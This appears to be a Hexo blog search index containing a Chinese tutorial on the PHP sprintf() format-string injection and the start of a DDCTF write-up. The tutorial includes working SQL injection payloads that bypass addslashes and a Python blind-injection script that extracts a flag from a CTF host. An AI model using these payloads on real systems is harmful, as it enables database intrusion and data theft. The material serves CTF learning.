<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>PHP sprintf格式化字符串漏洞</title>
      <link href="/2019/04/19/PHP-sprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/04/19/PHP-sprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g281m9qmayj30d605omxg.jpg" alt=""></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>sprintf()<br>把百分号（%）符号替换成一个作为参数进行传递的变量：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$number = <span class="number">2</span>;</span></span><br><span class="line"><span class="php">$str = <span class="string">"Shanghai"</span>;</span></span><br><span class="line"><span class="php">$txt = sprintf(<span class="string">"There are %u million cars in %s."</span>,$number,$str);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There are <span class="number">2</span> million cars <span class="keyword">in</span> Shanghai.</span><br></pre></td></tr></table></figure></p><p>定义和用法<br>sprintf() 函数把格式化的字符串写入变量中。</p><p>arg1、arg2、++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p><p>注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 “\$” 组成。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$number = <span class="number">123</span>;</span></span><br><span class="line">$txt = sprintf("带有两位小数：%1\$.2f</span><br><span class="line"><span class="php">&lt;br&gt;不带小数：%<span class="number">1</span>\$u<span class="string">",$number);</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>结果:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">带有两位小数：<span class="number">123.00</span></span><br><span class="line">不带小数：<span class="number">123</span></span><br></pre></td></tr></table></figure></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>接下来看看sprintf()的底层实现方法<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (format[inpos]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        zend_string * t;</span><br><span class="line">        zend_string * <span class="built_in">str</span> = zval_get_tmp_string(tmp, &amp;t);</span><br><span class="line">        php_sprintf_appendstring( &amp; result, &amp;outpos, ZSTR_VAL(<span class="built_in">str</span>), <span class="built_in">width</span>, precision, padding, alignment, ZSTR_LEN(<span class="built_in">str</span>), <span class="number">0</span>, expprec, <span class="number">0</span>);</span><br><span class="line">        zend_tmp_string_release(t);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">    php_sprintf_appendint( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, always_sign);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">    php_sprintf_appenduint( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'g'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'G'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'f'</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">    php_sprintf_appenddouble( &amp; result, &amp;outpos, zval_get_double(tmp), <span class="built_in">width</span>, padding, alignment, precision, adjusting, format[inpos], always_sign);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'c'</span>:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, (<span class="built_in">char</span>) zval_get_long(tmp));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">3</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'x'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">4</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'X'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">4</span>, HEXCHARS, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">    php_sprintf_append2n( &amp; result, &amp;outpos, zval_get_long(tmp), <span class="built_in">width</span>, padding, alignment, <span class="number">1</span>, hexchars, expprec);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'%'</span>:</span><br><span class="line">    php_sprintf_appendchar( &amp; result, &amp;outpos, <span class="string">'%'</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到， php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：<br>如果我们输入<code>&quot;%\&quot;</code>或者<code>&quot;%1$\&quot;</code>,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么<code>&quot;%\&quot;</code>,<code>&quot;%1$\&quot;</code>就因为没有经过任何处理而被替换为空。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27znox1u3j30ql0gnq3s.jpg" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27zuu2rx9j30qr0fd3z8.jpg" alt=""></p><p>因此sprintf注入的原理就是</p><p>我们用一个15种类型之外的 <code>&quot;\&quot;</code>来代替格式字符类型让函数替换为空，则“%1$\’”后面的单引号就能闭合前面的单引号，以下是一些例子帮助我们更好的理解</p><p><strong>不带占位符的</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$sql=<span class="string">"select * from user where username='%\' and 1=1 #';"</span>;</span></span><br><span class="line"><span class="php">$user=<span class="string">'admin'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> sprintf($sql,$user);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#';</span></span><br></pre></td></tr></table></figure></p><p>注意：username=’’这里是两个单引号不是双引号</p><p><strong>带有占位符：</strong><br>先看不带的原样输出<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280cueav7j30v60h6406.jpg" alt=""><br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="attribute">1</span>=1#</span><br><span class="line"><span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">'and 1=1#'</span></span><br><span class="line">SELECT * <span class="keyword">FROM</span> t WHERE <span class="attribute">a</span>=<span class="string">'admin'</span> <span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">'and 1=1#'</span></span><br></pre></td></tr></table></figure></p><p>进行绕过<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（<span class="string">'），双引号（"），反斜杠（\），NULL</span></span><br><span class="line"><span class="string">$input = addslashes ("%1$'</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#" );</span></span><br><span class="line">$b = <span class="keyword">sprintf</span> (<span class="string">"AND b='%s'"</span>, $input );</span><br><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM t WHERE a='%s' $b "</span>, <span class="string">'admin'</span> );</span><br><span class="line">echo  $sql ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>对$input与$b进行了拼接<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM t WHERE a='%s' AND b='%1$\' and 1=1#' "</span>, <span class="string">'admin'</span> );</span><br></pre></td></tr></table></figure></p><p>很明显，这个句子里面的<code>\</code>是由addsashes为了转义单引号而加上的，使用%s与<code>%1$\</code>类匹配admin，那么admin只会出现在%s里，<code>%1$\</code>为空<br>所以输出<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span>$\' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">AND</span> b='%<span class="number">1</span>$\' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#'</span></span><br><span class="line"><span class="built_in">SELECT</span> * FROM t <span class="built_in">WHERE</span> a='admin' <span class="keyword">AND</span> b='' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="meta">#'</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280l04clnj30x70hjgn1.jpg" alt=""><br>对于这个问题，我们还可以这样写<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">sprintf</span> (<span class="string">"SELECT * FROM table WHERE a='%1$\' AND b='%d' and 1=1#' "</span>,<span class="string">'admin'</span>);</span><br></pre></td></tr></table></figure></p><p>result:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> t WHERE <span class="attribute">a</span>=<span class="string">'admin'</span> <span class="keyword">AND</span> <span class="attribute">b</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="attribute">1</span>=1#'</span><br></pre></td></tr></table></figure></p><p>第一个格式化处匹配时为空，会让给后面的格式化匹配</p><p>以上两个例子是吃掉’\’来使得单引号逃逸出来</p><p>下面这个例子我们构造单引号<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$input1 = <span class="string">'%1$c) OR 1 = 1 /*'</span> ;</span></span><br><span class="line"><span class="php">$input2 = <span class="number">39</span> ;</span></span><br><span class="line"><span class="php">$sql = <span class="string">"SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s"</span> ;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($sql.<span class="string">"&lt;br&gt;"</span>);</span></span><br><span class="line"><span class="php">$sql = sprintf ( $sql , $input2 );</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>  $sql ;</span></span><br></pre></td></tr></table></figure></p><p>结果：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">' %1$c) OR 1 = 1 /* '</span>) <span class="keyword">AND</span> baz = %s</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">' '</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/* ') AND baz = 39</span></span><br></pre></td></tr></table></figure></p><p>%c起到了类似chr()的效果，将数字39转化为‘，从而导致了sql注入。</p><p>所以结果为：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">''</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/*) AND baz = 39</span></span><br></pre></td></tr></table></figure></p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>i春秋的 “迎圣诞，拿大奖”活动赛题<br><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=60469" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion?t=1&amp;r=60469</a></p><p>进行fuzz时 ，当输入<code>%</code>时爆sprintf()错误<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280yj6qcuj30ul0byglz.jpg" alt=""></p><p>于是构造<code>username=admin%1$\&#39; and 1=2#</code>与 <code>username=admin%1$\&#39; and 1=1#</code><br>于是写下脚本：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding : utf-8 _*_</span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> re</span><br><span class="line"><span class="built_in">import</span> urllib2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">headers</span> = &#123;</span><br><span class="line">'User-Agent' : 'Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span>',</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">dbname</span> = <span class="string">""</span></span><br><span class="line"><span class="attr">chars</span> = '<span class="number">0123456789</span>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://00eec0b6e68b4332b078c559e3fee6307720121e6aaf49e4.changame.ichunqiu.com/"</span></span><br><span class="line">for m <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">50</span>):</span><br><span class="line">   for i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">       <span class="attr">s</span> = <span class="string">"%1$' or ascii(substr((select flag from flag),"</span>+str(m)+<span class="string">",1))="</span>+str(i)+<span class="string">"#"</span></span><br><span class="line">       <span class="comment"># str1 = urllib2.quote(s)</span></span><br><span class="line">       <span class="attr">str1</span> = s</span><br><span class="line">       <span class="attr">data=&#123;'username'</span> : str1, 'password' : '<span class="number">12313</span>'&#125;</span><br><span class="line">       <span class="comment"># print str1</span></span><br><span class="line">       <span class="comment"># print urllib2.unquote(str1)</span></span><br><span class="line">       <span class="attr">req</span> = requests.post(<span class="attr">url=url,</span> <span class="attr">data=data,headers=headers)</span></span><br><span class="line">       <span class="comment"># print req.text</span></span><br><span class="line">       <span class="comment"># print req.text</span></span><br><span class="line">       <span class="attr">result</span> = re.findall('password error', req.content)</span><br><span class="line">       <span class="keyword">if</span> result:</span><br><span class="line">           <span class="attr">dbname</span> = dbname + chr(i)</span><br><span class="line">           print dbname</span><br><span class="line">           print chr(i)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019DDCTF-Writeup</title>
      <link href="/2019/04/18/2019DDCTF-Writeup/"/>
      <url>/2019/04/18/2019DDCTF-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h1><p>考点:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">sprintf</span><span class="params">()</span></span>格式化字符串漏洞</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xiygunkj30vz0ctdg5.jpg" alt=""><br>发现调用了Auth.php,并且有个didictf_username参数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xqddfg3j30x30hpdhd.jpg" alt=""><br>访问Auth.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xrev326j30tz0a1t9c.jpg" alt=""><br>当加上didictf_username = admin这个头<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xsbpnyaj30u40cfjs5.jpg" alt=""><br>访问 app/fL2XID2i0Cdh.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2820kx99yj30qv0hk0tj.jpg" alt=""><br>其中app/Application.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>; <span class="comment">//定义一个公共变量$path</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,    <span class="comment">//创建一个php数组，其中从形参获取两个值转化为数组值。</span></span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>); <span class="comment">//定义http头json内容类型</span></span><br><span class="line">        <span class="keyword">echo</span> $ret;  <span class="comment">//显示数据加密后的json数据</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;  <span class="comment">//传入一个变量$path</span></span><br><span class="line">    $path = trim($path);  <span class="comment">//删除$path首位空</span></span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);  <span class="comment">// ../ 替换为 空</span></span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path); <span class="comment">// ..\\ 替换为 空</span></span><br><span class="line">    <span class="keyword">return</span> $path; <span class="comment">//返回$path</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;  <span class="comment">// 如果$path为空，就直接结束了</span></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); <span class="comment">// 不为空就调用sanitizepath()做替换</span></span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;  <span class="comment">//如果处理过的$path长度不严格等于18，就跳出</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;   <span class="comment">// 把$path读取出来以后传入response()</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>app/Session.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line">    <span class="comment">//定义了一堆类变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123; <span class="comment">//HTTP_DIDICTF_USERNAME: admin时才能继续执行</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key(); <span class="comment">//调用get_key()</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123; <span 